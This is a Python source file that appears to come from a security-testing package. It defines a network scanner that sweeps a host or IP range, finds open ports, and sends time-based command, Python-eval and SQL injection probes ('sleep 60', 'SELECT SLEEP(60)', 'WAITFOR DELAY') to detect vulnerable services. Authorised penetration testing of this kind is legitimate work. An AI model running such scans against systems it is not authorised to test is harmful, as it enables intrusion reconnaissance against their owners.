import ipaddress
import random
import re
import socket
import time
from TheSilent.clear import clear

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

def beluga(host,delay=0):
    hits = []

    mal_command = [r"sleep 60",
                   r"\s\l\e\e\p \6\0"]

    mal_python = [r"eval(compile('import time\ntime.sleep(60)','beluga','exec'))"]

    mal_sql = [r"SELECT SLEEP(60);",
               r"WAITFOR DELAY '00:01';"]

    if re.search("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$",host):
        hosts = []
        for _ in ipaddress.ip_network(host,strict=False):
            hosts.append(str(_))
        hosts = random.sample(hosts,len(hosts))

    else:
        hosts = [host]

    ports = [23,80,443,1433,3306,8000,8001,8080,8443]

    clear()
    for host in hosts:
        print(CYAN + f"checking: {host}")
        port_list = []
        ports = random.sample(ports,len(ports))
        for port in ports:
            time.sleep(delay)
            try:
                tcp_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                tcp_socket.settimeout(10)
                tcp_socket.connect((host,port))
                tcp_socket.close()
                port_list.append(port)
            except:
                pass

        for port in port_list:
            for mal in mal_command:
                time.sleep(delay)
                try:
                    tcp_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    tcp_socket.settimeout(120)
                    tcp_socket.connect((host,port))
                    start = time.time()
                    tcp_socket.send(mal.encode())
                    data = tcp_socket.recv(4096)
                    end = time.time()
                    tcp_socket.close()
                    if end - start >= 45:
                        hits.append(f"{host}:{port}/tcp ({mal})- {data}")
                except:
                    pass

            for mal in mal_python:
                time.sleep(delay)
                try:
                    tcp_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    tcp_socket.settimeout(120)
                    tcp_socket.connect((host,port))
                    start = time.time()
                    tcp_socket.send(mal.encode())
                    data = tcp_socket.recv(4096)
                    end = time.time()
                    tcp_socket.close()
                    if end - start >= 45:
                        hits.append(f"{host}:{port}/tcp ({mal})- {data}")
                except:
                    pass

            for mal in mal_sql:
                time.sleep(delay)
                try:
                    tcp_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    tcp_socket.settimeout(120)
                    tcp_socket.connect((host,port))
                    start = time.time()
                    tcp_socket.send(mal.encode())
                    data = tcp_socket.recv(4096)
                    end = time.time()
                    tcp_socket.close()
                    if end - start >= 45:
                        hits.append(f"{host}:{port}/tcp ({mal})- {data}")
                except:
                    pass

    hits.sort()
    clear()
    if len(hits) > 0:
        for hit in hits:
            print(RED + hit)
    else:
        print(GREEN + "we didn't find anything interesting")
